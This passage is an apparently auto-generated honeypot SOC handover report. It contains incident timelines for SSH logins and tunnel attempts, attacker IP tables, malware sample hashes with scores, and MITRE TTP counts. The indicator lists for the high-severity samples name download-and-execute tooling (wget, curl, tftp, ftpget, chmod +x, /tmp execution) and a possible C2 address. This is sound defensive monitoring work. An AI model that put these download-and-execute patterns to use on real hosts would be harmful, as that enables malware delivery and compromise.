- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76abef8ad0fc

| Field | Detail |
|---|---|
| **Source IP** | `89.203.142[.]96` |
| **First Seen** | 2026-07-27 12:29 |
| **Last Seen** | 2026-07-27 12:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:29:58` | `cowrie.session.connect` |
| `2026-07-27 12:29:59` | `cowrie.client.version` |
| `2026-07-27 12:29:59` | `cowrie.client.kex` |
| `2026-07-27 12:29:59` | `cowrie.login.success` |
| `2026-07-27 12:30:00` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.203.142[.]96` to AbuseIPDB if not already reported
- [ ] Block `89.203.142[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9306b324940e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-27 12:31 |
| **Last Seen** | 2026-07-27 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:31:39` | `cowrie.session.connect` |
| `2026-07-27 12:31:39` | `cowrie.client.version` |
| `2026-07-27 12:31:39` | `cowrie.client.kex` |
| `2026-07-27 12:31:40` | `cowrie.login.success` |
| `2026-07-27 12:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1964302d7a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-27 12:31 |
| **Last Seen** | 2026-07-27 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:31:40` | `cowrie.session.connect` |
| `2026-07-27 12:31:40` | `cowrie.client.version` |
| `2026-07-27 12:31:40` | `cowrie.client.kex` |
| `2026-07-27 12:31:41` | `cowrie.login.success` |
| `2026-07-27 12:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53eb0e1d91a4

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]152` |
| **First Seen** | 2026-07-27 12:43 |
| **Last Seen** | 2026-07-27 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:43:30` | `cowrie.session.connect` |
| `2026-07-27 12:43:30` | `cowrie.client.version` |
| `2026-07-27 12:43:30` | `cowrie.client.kex` |
| `2026-07-27 12:43:33` | `cowrie.login.success` |
| `2026-07-27 12:43:33` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]152` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301bf72b6798

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-27 12:47 |
| **Last Seen** | 2026-07-27 12:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:47:31` | `cowrie.session.connect` |
| `2026-07-27 12:47:31` | `cowrie.client.version` |
| `2026-07-27 12:47:31` | `cowrie.client.kex` |
| `2026-07-27 12:47:33` | `cowrie.login.success` |
| `2026-07-27 12:47:33` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc879adca403

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-27 12:49 |
| **Last Seen** | 2026-07-27 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:49:26` | `cowrie.session.connect` |
| `2026-07-27 12:49:26` | `cowrie.client.version` |
| `2026-07-27 12:49:26` | `cowrie.client.kex` |
| `2026-07-27 12:49:27` | `cowrie.login.success` |
| `2026-07-27 12:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdeb1cf35ba6

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-27 12:49 |
| **Last Seen** | 2026-07-27 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:49:26` | `cowrie.session.connect` |
| `2026-07-27 12:49:26` | `cowrie.client.version` |
| `2026-07-27 12:49:27` | `cowrie.client.kex` |
| `2026-07-27 12:49:27` | `cowrie.login.success` |
| `2026-07-27 12:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0145ffa24da1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-27 12:49 |
| **Last Seen** | 2026-07-27 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:49:38` | `cowrie.session.connect` |
| `2026-07-27 12:49:38` | `cowrie.client.version` |
| `2026-07-27 12:49:38` | `cowrie.client.kex` |
| `2026-07-27 12:49:39` | `cowrie.login.success` |
| `2026-07-27 12:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48926f8db11

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-27 12:54 |
| **Last Seen** | 2026-07-27 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 12:54:37` | `cowrie.session.connect` |
| `2026-07-27 12:54:37` | `cowrie.client.version` |
| `2026-07-27 12:54:37` | `cowrie.client.kex` |
| `2026-07-27 12:54:40` | `cowrie.login.success` |
| `2026-07-27 12:54:41` | `cowrie.direct-tcpip.request` |
| `2026-07-27 12:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.118[.]113` | **26** | 2026-07-27 10:56 | 2026-07-27 12:04 | 52m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **10** | 2026-07-27 11:21 | 2026-07-27 12:54 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `104.251.181[.]37` | **6** | 2026-07-27 11:45 | 2026-07-27 11:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-27 11:02 | 2026-07-27 12:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.154.138[.]165` | **4** | 2026-07-27 11:57 | 2026-07-27 11:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-27 11:51 | 2026-07-27 11:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-27 12:24 | 2026-07-27 12:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `150.95.66[.]172` | **2** | 2026-07-27 12:05 | 2026-07-27 12:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `195.88.120[.]62` | **2** | 2026-07-27 11:25 | 2026-07-27 11:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]115` | **2** | 2026-07-27 12:34 | 2026-07-27 12:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]102` | **2** | 2026-07-27 11:52 | 2026-07-27 11:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]141` | 1 | 2026-07-27 12:05 | 2026-07-27 12:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.50.195[.]175` | 1 | 2026-07-27 11:35 | 2026-07-27 11:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]89` | 1 | 2026-07-27 12:29 | 2026-07-27 12:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.131[.]22` | 1 | 2026-07-27 11:27 | 2026-07-27 11:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]250` | 1 | 2026-07-27 12:44 | 2026-07-27 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.11.162[.]163` | 1 | 2026-07-27 11:58 | 2026-07-27 11:58 | 11s | 0 | `T1592` | 🟢 LOW |
| `65.20.217[.]64` | 1 | 2026-07-27 12:23 | 2026-07-27 12:23 | 8s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-07-27 11:27 | 2026-07-27 11:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-07-27 12:44 | 2026-07-27 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-27 12:54 | 2026-07-27 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]185` | 1 | 2026-07-27 11:17 | 2026-07-27 11:17 | 4s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]14` | 1 | 2026-07-27 11:17 | 2026-07-27 11:17 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]214` | 1 | 2026-07-27 11:14 | 2026-07-27 11:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]215` | 1 | 2026-07-27 11:15 | 2026-07-27 11:15 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]80` | 1 | 2026-07-27 11:14 | 2026-07-27 11:14 | 11s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]83` | 1 | 2026-07-27 11:15 | 2026-07-27 11:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `95.165.77[.]31` | 1 | 2026-07-27 12:25 | 2026-07-27 12:27 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 40/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `44fcd7a6a61dd418b64fd2fa3e0048d139740bf74a77d261a6900e24609e83f6` | ELF Binary (Linux executable) (x86 32-bit) | `44fcd7a6a61dd418...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `203.198.173[.]137` | HK | VDSL Trial Cust : Excalibur Capital Ltd | **100** ⚠️ | 50 |
| `150.95.66[.]172` | TH | ZCOM THAI EP | **100** ⚠️ | 6 |
| `186.16.213[.]54` | PY | Telecel S.A. | **100** ⚠️ | 7 |
| `91.231.89[.]83` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `91.196.152[.]185` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `113.11.34[.]221` | BD | BDCOM Online Limited, Internet Service Provider, | **100** ⚠️ | 50 |
| `108.90.216[.]10` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 10 |
| `190.57.233[.]133` | AR | Gigared S.A. | **100** ⚠️ | 50 |
| `82.65.140[.]218` | FR | Free SAS | **100** ⚠️ | 50 |
| `161.132.54[.]218` | PE | Red Cientifica Peruana | **100** ⚠️ | 20 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 66 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 46 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 144 cases |
| Tool 34  | Credential Extractor        | ✅ 94 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (11.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 46 priority case(s) shown individually · 28 recon entry/entries in table (11 group(s) consolidating 65 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
